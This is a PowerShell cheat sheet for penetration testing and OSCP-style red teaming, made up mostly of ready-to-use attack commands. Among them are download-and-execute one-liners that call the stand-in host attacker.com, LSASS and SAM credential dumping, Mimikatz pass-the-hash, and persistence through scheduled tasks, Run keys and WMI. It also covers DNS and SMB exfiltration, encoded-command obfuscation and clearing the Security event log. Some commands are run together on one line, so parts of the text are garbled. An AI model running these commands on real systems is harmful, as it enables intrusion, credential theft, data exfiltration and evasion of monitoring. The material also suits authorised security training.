# Powershell
## **Basic PowerShell Commands & Aliases**

### **System Information Gathering**

```
whoami                      # Current user
whoami /priv                # View privileges of current user
Get-ComputerInfo            # Get detailed system information
systeminfo                  # List OS and patch information
hostname                    # Get computer name
ipconfig /all               # Get network adapter configuration
net user                    # List local users
net localgroup Administrators # Show local admins
```


### **Aliases for Basic Commands**

```
ls -> Get-ChildItem         # List files and directories
dir -> Get-ChildItem        # Alternative listing files
pwd -> Get-Location         # Show current directory
cd -> Set-Location          # Change directory
echo -> Write-Output        # Print to console
```


---

## **Intermediate PowerShell for Penetration Testing**

### **Network Enumeration**

```
Get-NetIPConfiguration      # Show IP configuration
Test-NetConnection -ComputerName google.com -Port 443 # Check if a port is open
Get-NetTCPConnection        # Show active network connections
Get-NetFirewallRule         # List firewall rules
Get-NetAdapter              # Show network adapters
arp -a                      # Show ARP table
route print                 # Show routing table

```

### **User & Group Enumeration**

```
Get-LocalUser               # List local users
Get-LocalGroupMember Administrators  # List members of Admin group
Get-WmiObject Win32_UserAccount | Select Name, SID # List users with SIDs
```

### **Privilege Escalation Enumeration**

```
whoami /groups              # Show group memberships
whoami /priv                # Show user privileges
Get-Process | Where-Object {$_.Path -like "*System32*"} # Check processes running as SYSTEM
Get-Service | Where-Object {$_.StartName -eq "LocalSystem"} # Show services running as SYSTEM
```


---

## **Advanced PowerShell for Red Teaming & OSCP**

### **File Download & Execution**

```
Invoke-WebRequest -Uri "http://attacker.com/malware.exe" -OutFile "C:\Users\Public\malware.exe"
Start-Process "C:\Users\Public\malware.exe"
```


### **Credential Dumping**

```
(Get-ItemProperty -Path "HKLM:\SAM\SAM\Domains\Account\Users\000001F4").V # Dump SAM hashes (requires SYSTEM)
```

### **Persistence Techniques**

```
New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" | Register-ScheduledTask -TaskName "Persistence"
```
### **Lateral Movement**

powershell

CopyEdit

```
Invoke-Command -ComputerName "VictimPC" -ScriptBlock {whoami} -Credential (Get-Credential) # Remote Execution
```

---

## **PowerShell Exploitation Tools**

- **PowerView** – AD enumeration
- **PowerUp** – Privilege escalation
- **Invoke-Mimikatz** – Credential dumping
- **Nishang** – Post-exploitation framework


## **🔥 Initial Access & Execution**

### **Bypassing Execution Policy**

```
Set-ExecutionPolicy Unrestricted -Force    # Allow all scripts to run powershell -ep bypass                      # Bypass execution policy temporarily
```

### **Download & Execute Payloads**

```
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1') (New-Object System.Net.WebClient).DownloadFile("http://attacker.com/nc.exe", "$env:TEMP\nc.exe") Start-Process "$env:TEMP\nc.exe"
```

### **Memory Injection**

```
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("BASE64_PAYLOAD"))
```

---

## **📡 Enumeration**

### **System Info**

powershell

CopyEdit

```
Get-ComputerInfo
(Get-WMIObjectWin32_OperatingSystem).Caption
```

### **User & Privileges**

```
whoami /priv
net localgroup Administrators
Get-LocalGroupMember Administrators
```


### **Network**

```
ipconfig /all
Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" }
```

### **Active Directory**
```
Get-ADUser -Filter * -Property * | Select Name, SamAccountName
Get-ADComputer -Filter * | Select Name, OperatingSystem
```
---

## **🚀 Privilege Escalation**

### **Find Weak Service Permissions**

```
Get-WMIObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"}
```

### **Token Impersonation**

```
Invoke-TokenManipulation -EnablePriv
```

### **Check for Unquoted Service Paths**

powershell

CopyEdit

```
Get-WMIObject Win32_Service | Select-String -Pattern '"C:\\Program Files\\' | Select PathName
```

### **Check for AlwaysInstallElevated**

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
```
---

## **🔑 Credential Dumping**

### **LSASS Dump (Requires Admin)**


```
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

### **Dump Credentials from Registry**

```
reg save HKLM\SAM C:\temp\SAM reg save HKLM\SYSTEM C:\temp\SYSTEM
```

### **Mimikatz via PowerShell**

```
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1') Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```


---

## **🛠️ Persistence**

### **Scheduled Tasks**

```
schtasks /create /sc onlogon /tn "Updater" /tr "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### **Registry Run Key**

```
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\script.ps1"
```

### **WMI Event Subscription**

```
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="Persistence"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"}
```


---

## **🎯 Lateral Movement**

### **PSExec**

```
Invoke-Command -ComputerName "VictimPC" -ScriptBlock {whoami} -Credential (Get-Credential)
```

### **Pass-the-Hash**

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:TARGET /ntlm:HASH /run:powershell.exe"'
```

### **WinRM (If Enabled)**

```
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)
```

---

## **📤 Data Exfiltration**

### **Copy Files Over SMB**

```
Copy-Item "C:\SensitiveData.txt" "\\attacker\share\SensitiveData.txt"
```

### **Encode & Exfiltrate Data**

```
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\SensitiveData.txt"))
```

### **DNS-Based Exfiltration**

```
nslookup $(Get-Content C:\SensitiveData.txt | Out-String) attacker.com
```

---

## **🕵️‍♂️ Obfuscation & Evasion**

### **String Obfuscation**

```
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd)) powershell.exe -EncodedCommand $enc
```

### **Hiding PowerShell Execution**

```
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File script.ps1
```

### **Disable Security Logging**


`wevtutil cl Security`

---

## **🚀 Tools to Use**

- **PowerView** (Active Directory Recon)
- **PowerUp** (Privilege Escalation)
- **Invoke-Mimikatz** (Credential Dumping)
- **Nishang** (Post-Exploitation)
- **Empire** (PowerShell C2 Framework)
- **PSExec** (Lateral Movement)